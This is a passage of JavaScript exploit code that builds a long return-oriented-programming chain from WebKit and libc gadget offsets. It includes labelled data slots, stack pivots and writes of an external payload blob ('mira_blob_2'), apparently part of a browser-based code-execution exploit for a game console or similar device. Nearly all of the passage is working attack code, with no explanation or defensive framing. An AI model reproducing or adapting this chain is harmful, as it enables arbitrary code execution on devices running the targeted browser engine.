webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176304, //L2709
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176320, //L2710
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+176288, //L2708
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2708:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2709:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2710:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+14959219, //cmp rax, rcx ; sete al
webkit_base+48555, //setl al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+176488, //L2712
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176504, //L2713
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176472, //L2711
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2711:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2712:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2713:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+176608, //L2715
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+176656, //L2718
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+176624, //L2716
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2715:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2716:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2717:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2718:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+176768, //L2719+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
libc_base+793877, //pop rsi
ropchain+176760, //L2719
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+811575 //pop rsp
]);
//L2719:
db([0, 0]); // 0x0
set_gadgets([
ropchain+176784, //L2719+24
ropchain+176800, //L2714
libc_base+811575, //pop rsp
ropchain+176816, //L2720
//L2714:
libc_base+811575, //pop rsp
ropchain+181688, //L2721
//L2720:
libc_base+793877, //pop rsi
ropchain+176872, //L2724
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2723:
db([4294967280, 4294967295]); // -0x10
set_gadget(libc_base+792472,); //pop rcx
//L2724:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+176960, //L2725
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+176976, //L2727
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2725:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2727:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+177120, //L2730
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+177088, //L2728
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177104, //L2729
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2728:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2729:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2730:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+177192, //L2731
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2731:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+177248, //L2734
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2734:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+177344, //L2737
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2736:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2737:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+177432, //L2738
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177448, //L2740
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2738:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2740:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+177600, //L2742
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177632, //L2744
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+177584, //L2741
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+177616, //L2743
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2741:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2742:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2743:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2744:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+177752, //L2746
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+177768, //L2747
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+177736, //L2745
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2745:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2746:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2747:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+177856, //L2748
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2748:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+177912, //L2751
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2751:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+178032, //L2752
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+178064, //L2754
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178048, //L2753
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2752:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2753:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2754:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270096, //mov al, [rdi]
libc_base+793877, //pop rsi
ropchain+178224, //L2758
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+178176, //L2755
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+178192, //L2756
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2755:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2756:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2757:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2758:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+178280, //L2760
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2760:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+178384, //L2761
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+178416, //L2763
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+178400, //L2762
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2761:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2762:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2763:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+178576, //L2767
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+178528, //L2764
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+178544, //L2765
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2764:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2765:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2766:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2767:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+178632, //L2769
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2769:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+178736, //L2770
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+178768, //L2772
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+178752, //L2771
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2770:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2771:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2772:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+178928, //L2776
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+178880, //L2773
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+178896, //L2774
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2773:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2774:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2775:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2776:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+178984, //L2778
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2778:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+179088, //L2779
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179120, //L2781
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179104, //L2780
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2779:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2780:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2781:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179192, //L2782
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179208, //L2783
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2782:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2783:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179368, //L2787
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+179320, //L2784
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179336, //L2785
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2784:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2785:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2786:
db([24, 0]); // 0x18
set_gadget(libc_base+788575,); //pop rax
//L2787:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+179424, //L2789
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2789:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+179528, //L2790
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+179560, //L2792
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179544, //L2791
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2790:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2791:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2792:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+179656, //L2794
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+179640, //L2793
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2793:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2794:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+179752, //L2797
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2796:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L2797:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+179840, //L2798
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179856, //L2800
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2798:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2800:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+180000, //L2803
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+179968, //L2801
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+179984, //L2802
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2801:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2802:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2803:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180072, //L2804
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2804:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+180128, //L2807
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2807:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+180224, //L2810
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2809:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2810:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+180312, //L2811
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180328, //L2813
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2811:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2813:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+180480, //L2815
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180512, //L2817
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+180464, //L2814
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+180496, //L2816
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2814:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2815:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2816:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2817:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+180632, //L2819
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+180648, //L2820
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+180616, //L2818
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2818:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2819:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2820:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+180736, //L2821
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2821:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+180792, //L2824
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2824:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+180864, //L2825
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2825:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+180920, //L2828
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2828:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L2829:
libc_base+793877, //pop rsi
ropchain+181024, //L2832
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2831:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2832:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+181112, //L2833
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181128, //L2835
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2833:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2835:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+181280, //L2837
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+181312, //L2839
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+181264, //L2836
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181296, //L2838
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2836:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2837:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2838:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2839:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+181408, //L2841
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+181392, //L2840
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2840:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2841:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+181496, //L2843
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2842:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2843:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+181568, //L2846
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2845:
db([4294967276, 4294967295]); // -0x14
set_gadget(libc_base+792472,); //pop rcx
//L2846:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+181632, //L2847
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2847:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+175544, //L2688
//L2721:
//L2682:
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2850:
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+792472, //pop rcx
//L2851:
(window.mira_blob_2||0),
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2853:
db([4294967260, 4294967295]); // -0x24
set_gadgets([
libc_base+792472, //pop rcx
//L2854:
(window.mira_blob_2_len||0),
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2856:
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+181904, //L2857
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+181920, //L2859
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2857:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2859:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+182080, //L2863
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+182032, //L2860
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182064, //L2862
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2860:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2861:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2862:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2863:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
libc_base+793877, //pop rsi
ropchain+182208, //L2865
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182224, //L2866
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+182192, //L2864
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2864:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2865:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2866:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+182328, //L2868
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+182376, //L2871
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+182344, //L2869
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2868:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2869:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2870:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2871:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+11676600, //cmp rax, rsi ; sete al
libc_base+269973, //movzx eax, al
webkit_base+414627, //shl rax, 3
libc_base+793877, //pop rsi
ropchain+182488, //L2872+8
libc_base+547636, //add rax, rsi
libc_base+186490, //mov rax, [rax]
